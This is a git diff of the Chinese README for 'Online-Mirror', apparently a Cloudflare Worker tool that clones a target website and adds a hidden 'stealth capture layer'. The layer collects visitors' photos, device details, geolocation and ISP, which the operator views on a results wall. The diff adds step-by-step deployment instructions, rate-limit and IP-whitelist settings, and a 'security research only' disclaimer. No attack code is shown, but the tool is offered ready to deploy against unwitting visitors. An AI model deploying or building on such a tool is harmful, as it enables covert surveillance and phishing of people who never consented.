@@ -45,7 +45,8 @@
 
 ### 1. 准备环境
 
-确保你拥有一个 Cloudflare 账号并安装了 Node.js。
+**1.1在github上fork本项目**
+**1.2确保你拥有一个 Cloudflare 账号并安装了 Node.js。**
 
 ### 2. 克隆仓库
 
@@ -54,24 +55,36 @@ git clone https://github.com/Huo-zai-feng-lang-li/Online-Mirror-master.git
 cd Online-Mirror
 ```
 
-### 3. 配置与部署
+### 3. 环境配置 (关键)
 
-1.  在 Cloudflare R2 中创建一个存储桶名为 `photos`。
-2.  执行部署：
+为了使镜像引擎正常工作，你需要在 Cloudflare 控制台完成以下初始化：
+
+1.  **R2 存储 (照片存储)**：
+    - 在 Cloudflare 控制台创建一个名为 `photos` 的 R2 存储桶。
+2.  **KV 命名空间 (频率限制 - 可选)**：
+    - 如果你需要防刷功能，请创建一个名为 `online-photos-limit-24-hour` 的 KV 空间。
+    - _提示：如果不配置 KV，系统后台将自动关闭频率限制，所有人均可无限次访问。_
+3.  **配置文件绑定 (配置即代码)**：
+    - 打开项目根目录下的 `wrangler.toml`。
+    - 将 `[[r2_buckets]]` 下的 `bucket_name` 设为你的 R2 桶名。
+    - 将 `[[kv_namespaces]]` 下的 `id` 替换为你的真实 KV ID（如果启用了限流）。
+
+### 4. 部署与上线
 
 ```bash
-npx wrangler login
-npx wrangler deploy
+npx wrangler login    # 登录 Cloudflare
+npx -y wrangler deploy # 一键部署到边缘节点
 ```
 
----
+> **进阶配置**：部署完成后，在 Worker 的 `Settings -> Variables` 中添加 `WHITELIST_IP` 环境变量，填入你自己的 IP，即可绕过 24 小时频率限制。
 
 ## 🖼️ 界面预览
 
-| 战术收集 (Tactical Console)  | 详细信息 (Mirror in Action) |
-| :----------------------------: | :-----------------------------: |
-| ![生成台](public/readme/1.png) | ![效果图](public/readme/2.png)  |
-| _极简、专业、工业感的控制面板_ | _100% 还原的目标站与隐身采集层_ |
+|   1. 正在采集 (Tactical Console)   |   2. 查看图片位置详情 (Mirror in Action)   |
+| :------------------------------: | :------------------------------: |
+|  ![正在采集](public/readme/1.png)  |  ![查看图片位置详情](public/readme/2.png)  |
+|   **3. 设置KV (Management)**   |  **4. 配置白名单 (Target Intel)**  |
+| ![设置KV](public/readme/3.png) | ![配置白名单](public/readme/4.png) |
 
 ---
 
@@ -81,11 +94,27 @@ npx wrangler deploy
 2.  **生成器**：输入 ID 与 目标 URL。
 3.  **结果墙**：在后台输入 ID 查看实时采集到的照片与设备信息。
 
+### 5. 战术配置 🛠️
+
+在 `wrangler.toml` 中配置你的专属参数：
+
+```toml
+[vars]
+WHITELIST_IP = "149.104.139.142" # 白名单IP，支持多个（逗号分隔），解锁无限点数与 VIP 模式
+```
+
+### 6. 安全与自动化 🛡️
+
+- **24h 速率限制**：由于 R2 资源宝贵，系统默认为普通访客提供 10 次/24h 的采集配额。
+- **1天自动清理**：已在 R2 设置 Expiration 策略，所有捕获数据 24 小时后物理抹除，保护隐私。
+- **Edge Native 解析**：利用 Cloudflare 边缘原生数据提取，国内直连即可获取 100% 准确的地理位置与 ISP 信息。
+
 ---
 
 ## ⚠️ 免责声明
 
 本工具仅供网络安全研究与合规测试使用。请严格遵守各地法律。滥用行为产生的法律责任由使用者自行承担。
+
 > 仅供个人测试、学习、研究使用，请勿用于非法用途。
 > 作者：Huo-zai-feng-lang-li
 > 邮箱：<1334132303@qq.com>
@@ -97,3 +126,7 @@ npx wrangler deploy
 ## 📜 许可证
 
 本项目基于 [MIT License](LICENSE) 授权。
+
+```
+
+```
